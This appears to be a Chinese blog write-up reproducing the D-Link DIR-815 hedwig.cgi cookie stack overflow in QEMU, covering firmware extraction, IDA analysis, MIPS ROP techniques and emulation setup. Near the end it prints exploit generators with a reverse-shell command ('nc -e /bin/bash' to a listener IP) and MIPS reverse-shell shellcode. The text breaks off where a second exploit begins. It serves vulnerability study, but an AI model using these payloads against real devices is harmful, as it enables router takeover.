---
title: D-Link DIR-815
date: 2022-04-23 08:42:04
tags:
    - iot
---

<!--more-->

# 前言

复现一个比较经典的[栈溢出](https://so.csdn.net/so/search?q=栈溢出&spm=1001.2101.3001.7020)漏洞：D-link DIR-815 栈溢出。这个栈溢出的原因是由于 cookie 的值过长导致的栈溢出。服务端取得客户端请求的 HTTP 头中 Cookie 字段中 uid 的值，格式化到栈上导致溢出。

# 固件下载

https://pmdap.dlink.com.tw/PMD/GetAgileFile?itemNumber=FIR1000487&fileName=DIR-815A1_FW101SSB03.bin&fileSize=3784844.0;

# 官方EXP

https://www.exploit-db.com/exploits/33863

![image-20220423085439555](https://s2.loli.net/2022/04/23/jePtk3R2vOIysx4.png)

![image-20220425094314348](https://s2.loli.net/2022/04/25/jQOebL5CEiGfK6r.png)

EXP和官方报告告诉我们D-Link的hedwig.cgi接口通过cookie不正确过滤用户提交的参数数据，允许远程攻击者利用漏洞提交特制请求触发缓冲区溢出，可使应用程序停止响应，造成拒绝服务攻击。

## 提取固件

`binwalk -Me bin文件`

![image-20220423090547355](https://s2.loli.net/2022/04/23/MF2E79GkWHO3PD1.png)

这里可能提出来的固件文件会报错，binwalk 出来的squashfs-root为空

![image-20220423091917618](https://s2.loli.net/2022/04/23/x3nsVJ1czqwSfmP.png)

### squashfs-root为空解决办法：

```
需要安装sasquatch：
git clone https://github.com/devttys0/sasquatch
安装依赖环境：
sudo apt-get install build-essential liblzma-dev liblzo2-dev zlib1g-dev
cd 到clone下来的文件下安装sasquatch：
./build.sh
```

之后，再进行binwalk解压，终于成功。

![image-20220423092202916](https://s2.loli.net/2022/04/23/vHIale8tufFGyb6.png)

# 漏洞分析

## 漏洞定位

因为官方EXP报告漏洞点在hedwig.cgi，使用find -name "hedwig.cgi"或者grep -r "hedwig.cgi"查找。

![image-20220423092507438](https://s2.loli.net/2022/04/23/pgG4C2v5qJ8bFkn.png)

个人感觉find没有grep好用

如果find的话最好再使用一个命令：ls -l ./htdocs/web/hedwig.cgi

> ls -l 作用：返回hedwig.cgi是指向./htdocs/cgibin的符号链接

![image-20220423095901993](https://s2.loli.net/2022/04/23/D5tTvYL4feWZR1x.png)

效果和grep命令一样的，都是最后定位到了cgibin文件

### 查看漏洞文件信息

![image-20220423100201294](https://s2.loli.net/2022/04/23/IGQslBt1wyoiAZT.png)

32位，MIPS架构

### IDA静态分析

根据之前的漏洞分析，是和`cookie`有关，在string中进行搜索`cookie`，可以找到有一个函数`HTTP_COOKIE`

![image-20220423130737889](https://s2.loli.net/2022/04/23/y768APYDLuI9W3h.png)

![image-20220423130807232](https://s2.loli.net/2022/04/23/Gr3blhR8UHPCaN7.png)

按x交叉引用返回到了`sess_get_uid`这个函数

![image-20220423130830919](https://s2.loli.net/2022/04/23/WAYsFyZOw65bfzx.png)

#### `sess_get_uid`函数分析

这个函数总的来说就是 

```
首先new了两个字符串数组v2和v4
判断是否是“HTTP_COOKIE”不是直接退出
利用v5的指针赋给v7遍历输入的字符串
如果匹配到最后一个字符' '，循环结束，free V2和V4
如果匹配到v7='='则把'='之前全都赋给v2,后面的内容赋给v4
最后会对v2中的内容进行一个判断是否为uid，判断通过了以后，就会将v4拼接入a1。
这里就可以想到如果v4够大，后面没有限制条件的话就可以造成栈溢出。	
```

![image-20220425095604803](https://s2.loli.net/2022/04/25/Bakhz5q12pK8JSt.png)

再次交叉引用可以看到在hedwigcgi_main+1C和hedwigcgi_main+1C8处有两次调用

![image-20220423135359249](https://s2.loli.net/2022/04/23/EjIeTlpLwc9kMCs.png)

#### 漏洞点

##### 1

![image-20220425094526609](https://s2.loli.net/2022/04/25/c1DjNgPFt8YzBAn.png)

`hedwigcgi_main`函数通过`sess_get_uid()`获取到`HTTP_COOKIE`中`uid=`之后的值，并将该内容按照`sprintf`函数中格式化字符串给定的形式拷贝（即"/runtime/session"）到栈中，由于没有检测并限制输入的大小，而v27在一开始定义最大为1024，所以v4过大就会导致栈溢出。

但是仔细观察漏洞函数里面还有一处snprintf也有相似的漏洞点

##### 2

![ ](https://s2.loli.net/2022/04/25/vCATIDtl3WRYiZ9.png)

​		这里的`string`仍然是`v4`，进一步观察，**发现`v4`在两个`sprintf`之间未被改变过**，也就是说，这里的`string`仍然是`cookie`中`uid=`后面的字符串，如果能走到这第二个`sprintf`的话，那么这里才是真正的溢出漏洞点，因为仍然是`v27`数组的溢出，两次拼接的字符串又一样，所以这里能覆盖上一次`sprintf`的内容。

但是如果要抵达第二个漏洞点的话，需要经过两个判断

![image-20220425192024589](https://s2.loli.net/2022/04/25/F2WIftUGpnqmQAu.png)

第一个判断就是需要有`/var/tmp`这个目录，这样`cgibin`才能在此路径下创建`temp.xml`文件用于数据的写入。为了抵达第二个sprintf函数，我们需手动创建/var/tmp

第二个判断haystack可以看到`sub_409A6C`中可对其操作

![image-20220425193419109](https://s2.loli.net/2022/04/25/w3jOlYbSvEu8AMn.png)

##### **分析`cgibin_parse_request`函数**

而sub_409A6C又是cgibin_parse_request的第一个参数，并且需要通过post的形式才能执行

![image-20220425193815639](https://s2.loli.net/2022/04/25/KTta21oNjHXDmez.png)

这个函数会先调取环境变量`REQUEST_URI`，并对其先以`?`进行字符串分割：

![image-20220426090346327](https://s2.loli.net/2022/04/26/BbfqMtpLJ8hcgln.png)

再进到`sub_402B40`函数中，发现这里会再以`=`进行一次字符串分割，对`=`后的内容再以`&`进行分割：	

![image-20220426090546052](https://s2.loli.net/2022/04/26/o1ZmlTj8WGYkq7u.png)

这其实就是对一个`URL`字符串的解析过程，分割后的字符串，都会被存放进内存中

之后，在`cgibin_parse_request`函数中，对`CONTENT_TYPE`这个环境变量进行了一个判断，下图的a1其实就是我们**POST传入内容**：

![image-20220426091553059](https://s2.loli.net/2022/04/26/EvtBoIS2knbCsje.png)

##### strncasecmp

```
函数定义：int strncasecmp(const char *s1, const char *s2, size_t n)
函数说明：strncasecmp()用来比较参数s1和s2字符串前n个字符，比较时会自动忽略大小写的差异。
```

这里先对环境变量`CONTENT_TYPE`中的内容的前`v17`位与`v18`进行一个比对，比对正确后就会调用一个未知的函数，这里的`v18`其实是`off_42C014`中的内容，而`v17`就是四个字节大小：

![image-20220426091718276](https://s2.loli.net/2022/04/26/cUI5dPoAmF1WTbh.png)

也就是说，我们**`CONTENT_TYPE`的前`12`位得是`application/`**才能过这个判断。那么此时`v16=1`，所以`(&off_42C014)[3 * v16 - 1] = (&off_42C014)[2]`，也就是下图圈出的数据，即跳转到了`0x403B10`处。

![image-20220426094300103](https://s2.loli.net/2022/04/26/bRQZKv428cxmpaT.png)

![image-20220426094700838](C:\Users\22761\AppData\Roaming\Typora\typora-user-images\image-20220426094700838.png)

在0x403B10处按P形成函数

![image-20220426095024021](C:\Users\22761\AppData\Roaming\Typora\typora-user-images\image-20220426095024021.png)

可见，**`CONTENT_TYPE`环境变量的后面应该是`x-www-form-urlencoded`**，匹配成功后

所以这里的环境变量`CONTENT_TYPE`是`application/x-www-form-urlencoded`（application/x-www-form-urlencoded：是最常见的 POST 提交数据的方式，浏览器的原生表单如果不设置 enctype 属性，那么最终就会以 application/x-www-form-urlencoded 方式提交数据，它是未指定属性时的默认值。 数据发送过程中会对数据进行序列化处理，以键值对形式?key1=value1&key2=value2的方式发送到服务器。 数据被编码成以 ‘&’ 分隔的键-值对, 同时以 ‘=’ 分隔键和值。非字母或数字的字符会被 percent-encoding。）

但是要使v9=-1前面还需经过一个函数`sub_402B40`

![image-20220425195940273](https://s2.loli.net/2022/04/25/qyiLHMGShCrTBFP.png)

##### `sub_402B40`函数

![image-20220425200243332](https://s2.loli.net/2022/04/25/1h3pvCqDQLWHeNt.png)

上网搜集资料后大牛说这个`v9`函数指针就是指向的`sub_409A6C`函数（这里我没懂）	

满足了以上条件，就能顺利地走到第二个`sprintf`了，也就是**真机环境中真正的栈溢出漏洞点**。

### 构造ROP chain

`		MIPS`架构下的栈溢出肯定也是需要通过构造`ROP`链来`getshell`的，不过由于`MIPS`有个特性，即无法开`NX`保护，这样就有了两种构造`ROP`链的方式：第一种就是纯`ROP`链，通过调用`system`函数来`getshell`；第二种就是通过构造`ROP`链，跳转至读入到栈/`bss`段等处的`shellcode`执行。在实际应用中，最常用的还是通过`ROP + shellcode`的方式来`getshell`。这里需要用到IDA脚本插件mipsrop.py

##### mipsrop

```
链接：https://pan.baidu.com/s/1UbNDwOjOrJwzrcQizwUUFw?pwd=7777 
提取码：7777
```

下载，完了放到ida的plugins目录就行，重启IDA。打开你的mips程序，点击edit->plugins——>mips rop finders。

但是我的ida7.7会出现报错

```
Traceback (most recent call last):
  File "<string>", line 2, in <module>
NameError: name 'mipsrop' is not defined
```

解决办法

```
在idapython中先输入以下代码

import mipsrop
mipsrop = mipsrop.MIPSROPFinder()
```

`mipsrop` 里面的`stackfinder()/tail()/system()`等选项很便于寻找一些`gadget`，也可以使用如`mipsrop.find("li .*, 1")`的形式，通过`.*`进行模糊匹配：

![image-20220425205849097](https://s2.loli.net/2022/04/25/xFRCbvSEng3taUA.png)

## 常见的`MIPS`架构的特性（`32`位`mipsel`）。

### 叶子函数与非叶子函数

叶子函数指的是**没有调用任何子函数的函数**，其返回地址会存放在`$ra`寄存器中，在该函数结束时，**直接就通过`$ra`寄存器跳转返回**。

非叶子函数自然就是指**其中调用了其他子函数的函数**，其返回地址`$ra`会在程序开始（`prologue`）**通过`sw`指令存放在栈上**，因为其中调用了其他子函数，肯定会需要改变`$ra`寄存器的值，来作为其他子函数的返回地址，所以最先的数据需要保存下来，然后在该函数结束（`epilogue`）时，再**对应地通过`lw`指令取出**，并跳转返回。

同样的道理，如果在某个函数中使用到了 **`$s0 ~ $s7`中的某些保存寄存器（包括`$fp`）** ，则也会在`prologue`处保存下来，并在`epilogue`处取出。

需要注意的是，`$s0 ~ $s7, $fp, $sp`在栈中存放的地址**依次递增**，因此，很容易想到，我们可以在栈溢出的同时，顺带着**控制到`$s0 ~ $s7`的值**。

`MIPS`的这个特性是一个在栈溢出中很好利用的点，若是二进制文件中没有或没有完整的`prologue/epilogue`段，**在`libc`的`scandir/scandir64`中**可以找到完整的汇编段，来控制这所有的寄存器：

![image-20220425210725333](https://s2.loli.net/2022/04/25/RFdwK47umcb8YAh.png)

![image-20220425210711569](https://s2.loli.net/2022/04/25/fGU5qW7h2KwXNpD.png)

### 流水线指令集相关特性

`MIPS`架构存在“流水线效应”，简单来说，就是本应该顺序执行的几条命令却同时执行了，其还存在缓存不一致性（`cache incoherency`）的问题。

 

首先举例说说 **“流水线效应”** ，最常见的就是跳转指令（如`jalr`）导致的**分支延迟效应**，任何一个分支跳转语句后面的那条语句叫做**分支延迟槽**，当它跳转指令填充好跳转地址，还没来得及跳转过去的时候，跳转指令的下一条指令（分支延迟槽）就已经执行了，可以认为是**它会先执行跳转指令的后一条指令，然后再跳转**。

 

再来说说 **“缓存不一致性”** 的问题，指的是：指令缓存区（`Instruction Cache`）和数据缓存区（`Data Cache`）两者的同步需要一个时间来同步，常见的就是，比如我们将`shellcode`写入栈上，此时这块区域还属于数据缓存区，如果我们此时像`x86_64`架构一样，直接跳转过去执行，就会出现问题，因此，我们**需要调用`sleep`函数**，先停顿一段时间，给它时间从数据缓存区转成指令缓存区，然后再跳转过去，才能成功执行。当然，有时候可能直接跳转过去也不会出错，这原因就比较多了，可能是由于两个缓冲区已经有足够时间同步，也有可能是和硬件层面有关的一些原因所导致的，但是保险来说，还是最好`sleep`一下。

再介绍一些构造`ROP`链的常用技巧：

### 跳转到某个函数的ROP链构造技巧

​	我们先来观察`MIPS`架构下某一个函数的开头部分，比如`system`函数最开始的这两行：

```
li      $gp, (_GLOBAL_OFFSET_TABLE_+0x7FF0 - .)  # Alternative name is '__libc_system'
addu    $gp, $t9
...
`
```

​	这里全局寄存器`$gp`从取了个偏移值（这个偏移值是相对于该函数地址的）之后，又与`$t9`寄存器相加，此时的 **`$t9`寄存器要求是该函数的首地址** 才行，也就是说，我们跳转到某个函数的时候，一定要通过`jalr $t9`类似的`gadget`进行跳转才行。

​	再来观察这个函数（`system`函数）的最后两行：

```
...
jr      $ra
addiu   $sp, 0x48
```

​	我们发现，最后的返回的时候，得是**通过`$ra`寄存器中的地址跳转**的，也就是说，我们在跳转到这个函数之前，就也得控制好`$ra`寄存器中的地址为我们跳转后执行完该函数，再下一个跳转到的地方。很方便的是，我们发现`move $t9, ...`这样的`gadget`之后，通常会有`lw $ra, ...`这样的`gadget`，最后再`jr $t9`，这类`gadget`**可以通过`mipsrop.tail()`来进行查找**：

![image-20220425212258529](https://s2.loli.net/2022/04/25/t4XDBC3RfMHv6Se.png)

​	通过这类`gadget`，就可以比较完美地实现跳转到某个函数的ROP链的构造。

### 跳转到shellcode的ROP链构造技巧

在`MIPS`架构中，我们通常都是在栈溢出的同时将`shellcode`读到栈上，然后再跳转过去执行，但是我们得知道`shellcode`在栈上的地址才行，这里可以用如`addiu $s0, $sp, ...`的`gadget`来得到栈上`shellcode`的地址，然后再找到一个`move $t9, $s0 ; jalr $t9`的`gadget`跳转过去。

 

可以**用`mipsrop.stackfinder()`找到**类似于`addiu $..., $sp, ...`的`gadget`：

![image-20220425212449473](https://s2.loli.net/2022/04/25/GAdSQ4nFiIvDs3N.png)

### 构造system(cmd)的常用gadget

如果这里我们想注入任意的`cmd`命令（比如反弹`shell`的命令），最简单的就是在栈溢出的同时将其写入栈上，那在我们调用`system`命令的时候，其第一个参数`$a0`就要是我们`cmd`命令的地址。

 

我们想要一个`addiu $a0, $sp, ...`的`gadget`，但是这样的`gadget`一般来说没有能满足我们要求的，之后的跳转大多都不太方便。

 

于是，我们想到可以通过如`addiu $s0, $sp, ...`和`move $a0, $s0`的组合命令实现，而一些原本要跳到`mempcpy`函数的地方，由于`mempcpy`函数的特性，恰好会同时包含上面两个`gadget`，也就不需要分两次跳转了，一段`gadget`就能搞定，例如：

 ![img](https://s2.loli.net/2022/04/25/ymtdoUhz3MJYTpS.png)

 

这里由于上面所说的流水线指令集的特性，在跳转到`t9`之前，其第一个参数`$a0`就已经被赋为`$s2`了。

## qemu系统模式复现

之前尝试用用户模式下复现报错有点多，直接试试系统模式复现，这里为了在qemu虚拟机中重现http服务。通过查看文件系统中的`/bin、/sbin、/usr/bin、/usr/sbin`可以知道`/sbin/httpd`应该是用于监听web端口的http服务，同时查看`/htdocs/web`文件夹下的cgi文件和php文件，可以了解到接受到的数据通过php+cgi来处理并返回客户端。

自己按配置所需写入新建conf文件内容。

```
find ./ -name '*http*'找到web配置文件httpcfg.php。
```

![image-20220427142555770](https://s2.loli.net/2022/04/27/Lfp7UsiebHNZryd.png)

查看内容后分析出`httpcfg.php`文件的作用是生成供所需服务的`配置文件`的内容，所以我们参照里面内容，自己创建一个conf作为生成的`配置文件`，填充我们所需的内容。

conf文件内容：

```
Umask 026
PIDFile /var/run/httpd.pid
LogGMT On  #开启log
ErrorLog /log #log文件
 
Tuning
{
    NumConnections 15
    BufSize 12288
    InputBufSize 4096
    ScriptBufSize 4096
    NumHeaders 100
    Timeout 60
    ScriptTimeout 60
}
 
Control
{
    Types
    {
        text/html    { html htm }
        text/xml    { xml }
        text/plain    { txt }
        image/gif    { gif }
        image/jpeg    { jpg }
        text/css    { css }
        application/octet-stream { * }
    }
    Specials
    {
        Dump        { /dump }
        CGI            { cgi }
        Imagemap    { map }
        Redirect    { url }
    }
    External
    {
        /usr/sbin/phpcgi { php }
    }
}
 
 
Server
{
    ServerName "Linux, HTTP/1.1, "
    ServerId "1234"
    Family inet
    Interface eth0 #对应qemu仿真路由器系统的网卡
    Address 192.168.x.x #qemu仿真路由器系统的IP
    Port "1234" #对应未被使用的端口
    Virtual
    {
        AnyHost
        Control
        {
            Alias /
            Location /htdocs/web
            IndexNames { index.php }
            External
            {
                /usr/sbin/phpcgi { router_info.xml }
                /usr/sbin/phpcgi { post_login.xml }
            }
        }
        Control
        {
            Alias /HNAP1
            Location /htdocs/HNAP1
            External
            {
                /usr/sbin/hnap { hnap }
            }
            IndexNames { index.hnap }
        }
    }
}
```



### 配置网络环境

安装网络配置工具：`apt-get install bridge-utils uml-utilities`

#### **1. 修改`ubuntu`网络配置文件`/etc/network/interfaces`**

修改`/etc/network/interfaces`文件为：

```
auto lo
iface lo inet loopback
 
auto eth0
iface eth0 inet dhcp
up ifconfig eth0 0.0.0.0 up
 
auto br0
iface br0 inet dhcp
 
bridge_ports eth0
bridge_maxwait 0
```

把上面的`eth0`全部换成`ens33`，或者将`/etc/default/grub`文件中`GRUB_CMDLINE_LINUX=""`的双引号中加上`net.ifnames=0 biosdevname=0`，然后再`sudo grub-mkconfig -o /boot/grub/grub.cfg`，重启系统后，就应该变为`eth0`了。

在修改完`/etc/network/interfaces`之后，需要用`sudo /etc/init.d/networking restart`命令重启一下网络配置。

#### **2. 编辑`qemu`的网络接口启动脚本`/etc/qemu-ifup`**

在`/etc/qemu-ifup`文件中写入：

```
#!/bin/sh
echo "Executing /etc/qemu-ifup"
echo "Bringing up $1 for bridge mode..."
sudo /sbin/ifconfig $1 0.0.0.0 promisc up
echo "Adding $1 to br0..."
sudo /sbin/brctl addif br0 $1
sleep 2
```

先创建后写入，再用`sudo chmod a+x /etc/qemu-ifup`命令赋予权限

#### **3. 创建包含`qemu`使用的所有桥的名称的配置文件`/etc/qemu/bridge.conf`**

在`/etc/qemu/bridge.conf`中写入`allow br0`即可。

**注：在网络环境按上述配置完成后，建议重启下`Ubuntu`虚拟机。**

### 配置qemu虚拟机并连接

我们用的是`x86_64`架构，所以需要`qemu`来模拟`mipsel`环境，`qemu`的安装命令如下：

```
sudo apt-get install qemu
sudo apt-get install qemu-user-static
sudo apt-get install qemu-system
```

由于该固件是`32`位小端序的`mips`架构，因此，我们也要下载相对应的内核及镜像文件。
	下载地址：`https://people.debian.org/~aurel32/qemu/mipsel/`.
	下载其中的`vmlinux-3.2.0-4-4kc-malta`内核以及`debian_squeeze_mipsel_standard.qcow2`镜像文件。

##### **qemu系统模式启动命令**

命名为`start.sh`，用`chmod +x start.sh`赋予可执行权限，再用`./start.sh`即可启动`qemu`了。

```
	
sudo qemu-system-mipsel -M malta -kernel vmlinux-3.2.0-4-4kc-malta -hda debian_squeeze_mipsel_standard.qcow2 -append "root=/dev/sda1 console=tty0" -net nic -net tap -nographic
```

| 参数              | 说明                               |
| ----------------- | ---------------------------------- |
| -M malta          | 指定要仿真的开发板：malta          |
| -kernel           | 要运行的镜像                       |
| -hda              | 指定硬盘镜像                       |
| -append cmdline   | 设置Linux内核命令行、启动参数      |
| -net nic          | 为虚拟机网卡（默认为tap0）         |
| -net tap          | 系统分配tap设备（默认为tap0）      |
| -net nic -net tap | 将虚拟机的网卡eth0连接真机里的tap0 |
| -nographic        | 非图形化启动，使用串口作为控制台   |

`qemu`的初始账号密码为`root/root`。

![image-20220427111522944](https://s2.loli.net/2022/04/27/uHWykAaMg47z9EO.png)

然后在`qemu`中，用`nano /etc/network/interfaces`命令修改其中内容：

```
allow-hotplug eth0
iface eth0 inet dhcp
```

![image-20220427111805096](C:\Users\22761\AppData\Roaming\Typora\typora-user-images\image-20220427111805096.png)

![image-20220427111901777](https://s2.loli.net/2022/04/27/jiwzN7cqrQ3TMK2.png)

将原先的`eth0`改为你的第一个网卡名称，因为我的就是eth0就不修改了。如果修改了用`ifup eth1`命令启用`eth1`接口或者干脆重启`qemu`之后，再`ip addr`

![image-20220427112221301](https://s2.loli.net/2022/04/27/t1ZFgM6h5LO7ABY.png)

但是我的ip还是有点问题，eth0还是没有被自动连接网络，只能手动设置，解决方法

```
ifconfig eth0 192.168.188.134/24 up
```

![image-20220427112512987](https://s2.loli.net/2022/04/27/em1f4RqZhTbyNiw.png)

设置好就可以与外机ping通了

#### 固件拷贝

将固件的提取的文件系统(在Ubuntu上)利用scp命令拷贝到mipsel虚拟机中

```
sudo scp -r squashfs-root root@192.168.x.x:/root/
```

如果觉得在qemu中不太好操作，建议用ssh命令在host主机上连接到qemu虚拟机：`ssh root@192.168.x.x`，这样就能在host主机的终端上操作qemu虚拟机了。

#### 准备工作 及 开启httpd服务

在`qemu`虚拟机的`squashfs-root`目录下新建一个`http_conf`配置文件，里面写入（需要改一下自己设置的网卡，`IP`，端口）：

#### 配置http_conf

```
Umask 026
PIDFile /var/run/httpd.pid
LogGMT On  #开启log
ErrorLog /log #log文件
 
Tuning
{
    NumConnections 15
    BufSize 12288
    InputBufSize 4096
    ScriptBufSize 4096
    NumHeaders 100
    Timeout 60
    ScriptTimeout 60
}
 
Control
{
    Types
    {
        text/html    { html htm }
        text/xml    { xml }
        text/plain    { txt }
        image/gif    { gif }
        image/jpeg    { jpg }
        text/css    { css }
        application/octet-stream { * }
    }
    Specials
    {
        Dump        { /dump }
        CGI            { cgi }
        Imagemap    { map }
        Redirect    { url }
    }
    External
    {
        /usr/sbin/phpcgi { php }
    }
}
 
 
Server
{
    ServerName "Linux, HTTP/1.1, "
    ServerId "1234"
    Family inet
    Interface eth1 #对应qemu仿真路由器系统的网卡
    Address 192.168.192.133 #qemu仿真路由器系统的IP
    Port "1234" #对应未被使用的端口
    Virtual
    {
        AnyHost
        Control
        {
            Alias /
            Location /htdocs/web
            IndexNames { index.php }
            External
            {
                /usr/sbin/phpcgi { router_info.xml }
                /usr/sbin/phpcgi { post_login.xml }
            }
        }
        Control
        {
            Alias /HNAP1
            Location /htdocs/HNAP1
            External
            {
                /usr/sbin/hnap { hnap }
            }
            IndexNames { index.hnap }
        }
    }
}
```

#### 配置init.sh命令

在`qemu`虚拟机的`squashfs-root`目录下创建`init.sh`的脚本进行初始化操作：

```
#!/bin/bash
echo 0 > /proc/sys/kernel/randomize_va_space
cp http_conf /
cp sbin/httpd /
cp -rf htdocs/ /
cp -r /etc /etc_bak
rm -rf /etc/services
 cp -r -T etc/ /
cp lib/ld-uClibc-0.9.30.1.so  /lib/
cp lib/libcrypt-0.9.30.1.so  /lib/
cp lib/libc.so.0  /lib/
cp lib/libgcc_s.so.1  /lib/
cp lib/ld-uClibc.so.0  /lib/
cp lib/libcrypt.so.0  /lib/
cp lib/libgcc_s.so  /lib/
cp lib/libuClibc-0.9.30.1.so  /lib/
cd /
rm -rf /htdocs/web/hedwig.cgi
rm -rf /usr/sbin/phpcgi
rm -rf /usr/sbin/hnap
ln -s /htdocs/cgibin /htdocs/web/hedwig.cgi
ln -s /htdocs/cgibin /usr/sbin/phpcgi
ln -s  /htdocs/cgibin /usr/sbin/hnap
./httpd -f http_conf
```

创建完记得

```
chmod +x init.sh
```

由于真机就是没开`ASLR`的，所以这里用`echo 0 > /proc/sys/kernel/randomize_va_space`关闭地址随机化，这里需要建立一个`/etc_bak`，对原先的`/etc`文件夹进行一个备份，在退出`qemu`虚拟机的时候，再用`fin.sh`还原，因为之后的操作会改变`/etc`文件夹中的内容，导致下一次启动`qemu`虚拟机会出问题。

这里`init.sh`脚本主要就是将一些要用的文件从我们解压出来的文件系统拷贝到下载的镜像文件的文件系统中，可能大家会有疑问，直接`chroot`改一下根目录不就行了，其实的确也可以，但是由于后面的`httpd`命令，需要挂载一下`dev`和`proc`目录，而且由于固件包解压出来的文件系统的`bin`文件夹中没有`nc`，之后反弹`shell`也会出问题，此外，还牵涉到其他一些问题，比如没有`PID`文件等等，所以用`chroot`改根目录也是比较复杂的，还不如直接这样复制到根目录下。

最后的`./httpd -f http_conf`命令就是根据我们的`http_conf`配置文件启动了`httpd`服务。

我们运行`init.sh`脚本（在qemu下运行），然后测试一下，成功启动了`httpd`服务：

![image-20220427152801941](https://s2.loli.net/2022/04/27/UnmyFMhG59PbzNv.png)

最后，退出`qemu`虚拟机的时候，记得运行`fin.sh`的脚本恢复`/etc`文件夹：

```
#!/bin/bash
rm -rf /etc
mv /etc_bak/etc /etc
rm -rf /etc_bak
```

创建完记得给权限

```
chmod +x fin.sh
```

## EXP

### 方法一：将生成的payload传给qemu机

这种方式其实是**不需要用`httpd -f http_conf`启动`httpd`服务的**，就是在`Ubuntu`物理机中将`payload`传给`qemu`虚拟机，然后在`qemu`中打`payload`并反弹`shell`给物理机。

首先，我们还是得确定`libc_base`，这里要用到`gdbserver`（[项目地址](https://github.com/rapid7/embedded-tools/tree/master/binaries/gdbserver)），下载对应的`gdbserver.mipsel`即可，然后将其传到`qemu`中，在`qemu`中用以下`run.sh`脚本启动：

```
#!/bin/bash
export CONTENT_LENGTH="11"
export CONTENT_TYPE="application/x-www-form-urlencoded"
export HTTP_COOKIE="uid=`cat payload`"
export REQUEST_METHOD="POST"
export REQUEST_URI="2333"
echo "winmt=pwner"|./gdbserver.mipsle 192.168.188.133:6666 /htdocs/web/hedwig.cgi
#echo "winmt=pwner"|/htdocs/web/hedwig.cgi
unset CONTENT_LENGTH
unset CONTENT_TYPE
unset HTTP_COOKIE
unset REQUEST_METHOD
unset REQUEST_URI

```

![image-20220427163458070](https://s2.loli.net/2022/04/28/cdN7bvlHGpmtorJ.png)

![image-20220427163436615](https://s2.loli.net/2022/04/28/bNsdpRErmgfL5Uu.png)

## gdb-multiarch使用

```
gdb连接调试（在ubuntu下运行）
gdb-multiarch -q ./bin/httpd    #-q参数，忽略一些警告提示

pwndbg> set  architecture arm（可忽略）
The target architecture is assumed to be arm
pwndbg>set sysroot /usr/arm-linux-gnueabi     设置动态链接库
pwndbg> target remote 127.0.0.1:1234

```

这里的`192.168.188.133`是物理机的`IP`，`6666`是自己设置的连接的端口，直接用`gdb-multiarch`设置好架构后，用`target remote 192.168.188.134(qemuip):6666`连上即可，然后直接`vmmap`就能拿到`libc_base`

![image-20220427163746294](https://s2.loli.net/2022/04/28/bXkIveCgWRxsZYz.png)

至于栈溢出的偏移，仍然用`cyclic`测一下就行，不再多说了。

![image-20220427175631440](https://s2.loli.net/2022/04/28/ap1sIluGt5KBNQR.png)

![image-20220427172444594](https://s2.loli.net/2022/04/28/KxYqMT5E8FakdLB.png)

#### **1. 纯ROP链**

```
from pwn import *
context(os = 'linux', arch = 'mips', log_level = 'debug')
 
cmd = b'nc -e /bin/bash 192.168.188.133 8888'
 
libc_base = 0x77fe2000
 
payload = b'a'*0x3cd
payload += p32(libc_base + 0x53200 - 1) # s0  system_addr - 1
payload += p32(libc_base + 0x169C4) # s1  addiu $s2, $sp, 0x18 (=> jalr $s0)
payload += b'a'*(4*7)
payload += p32(libc_base + 0x32A98) # ra  addiu $s0, 1 (=> jalr $s1)
payload += b'a'*0x18
payload += cmd
 
fd = open("payload", "wb")
fd.write(payload)
fd.close()
```

#### **2. ROP + shellcode**

```
from pwn import *
context(os = 'linux', arch = 'mips', log_level = 'debug')
 
libc_base = 0x77f34000
 
payload = b'a'*0x3cd
payload += b'a'*4
payload += p32(libc_base + 0x436D0) # s1  move $t9, $s3 (=> lw... => jalr $t9)
payload += b'a'*4
payload += p32(libc_base + 0x56BD0) # s3  sleep
payload += b'a'*(4*5)
payload += p32(libc_base + 0x57E50) # ra  li $a0, 1 (=> jalr $s1)
 
payload += b'a'*0x18
payload += b'a'*(4*4)
payload += p32(libc_base + 0x37E6C) # s4  move  $t9, $a1 (=> jalr $t9)
payload += p32(libc_base + 0x3B974) # ra  addiu $a1, $sp, 0x18 (=> jalr $s4)
 
shellcode = asm('''
    slti $a0, $zero, 0xFFFF
    li $v0, 4006
    syscall 0x42424
 
    slti $a0, $zero, 0x1111
    li $v0, 4006
    syscall 0x42424
 
    li $t4, 0xFFFFFFFD
    not $a0, $t4
    li $v0, 4006
    syscall 0x42424
 
    li $t4, 0xFFFFFFFD
    not $a0, $t4
    not $a1, $t4
    slti $a2, $zero, 0xFFFF
    li $v0, 4183
    syscall 0x42424
 
    andi $a0, $v0, 0xFFFF
    li $v0, 4041
    syscall 0x42424
    li $v0, 4041
    syscall 0x42424
 
    lui $a1, 0xB821 # Port: 8888
    ori $a1, 0xFF01
    addi $a1, $a1, 0x0101
    sw $a1, -8($sp)
 
    li $a1, 0x85BCA8C0 # IP: 192.168.188.133
    sw $a1, -4($sp)
    addi $a1, $sp, -8
 
    li $t4, 0xFFFFFFEF
    not $a2, $t4
    li $v0, 4170
    syscall 0x42424
 
    lui $t0, 0x6962
    ori $t0, $t0,0x2f2f
    sw $t0, -20($sp)
 
    lui $t0, 0x6873
    ori $t0, 0x2f6e
    sw $t0, -16($sp)
 
    slti $a3, $zero, 0xFFFF
    sw $a3, -12($sp)
    sw $a3, -4($sp)
 
    addi $a0, $sp, -20
    addi $t0, $sp, -20
    sw $t0, -8($sp)
    addi $a1, $sp, -8
 
    addiu $sp, $sp, -20
 
    slti $a2, $zero, 0xFFFF
    li $v0, 4011
    syscall 0x42424
''')
payload += b'a'*0x18
payload += shellcode
 
fd = open("payload", "wb")
fd.write(payload)
fd.close()
```



![image-20220427165450631](https://s2.loli.net/2022/04/28/LMU2PaEVfoJTvxW.png)

![image-20220427165439659](https://s2.loli.net/2022/04/28/obLT56DEte93JyX.png)

需要注意的是，得先执行`nc -lvnp 8888`开启监听，再打`payload`。

用`scp -r ./payload root@192.168.192.133:/root/squashfs-root`将`payload`文件传给`qemu`虚拟机后，在`run.sh`中直接用`echo "winmt=pwner"|/htdocs/web/hedwig.cgi`打就行了，但是我可能哪里出现了问题并没有打通，后续我发现是我的没把rop和rop+shellcode分别重命名成payload，不然run.sh是读不到rop或者rop+shellcode的payload,但是改过了传输过去运行还是有点问题……（好吧，我没找到解决办法）

![image-20220428091601021](https://s2.loli.net/2022/04/28/R3KWAiw7UH2QuIE.png)

这是大佬运行成功的截图

![img](https://s2.loli.net/2022/04/28/KdLqfh9aZEFlWBn.png)

### 方法二：直接发送http报文

第一种不行就试试第二种，我们之前开启`httpd`服务，就是为了这种打`exp`的方式，直接发送数据包给之前`http_conf`配置文件中设置的`192.168.188.133:1234`即可。

#### EXP1（纯rop）

```
from pwn import *
import requests
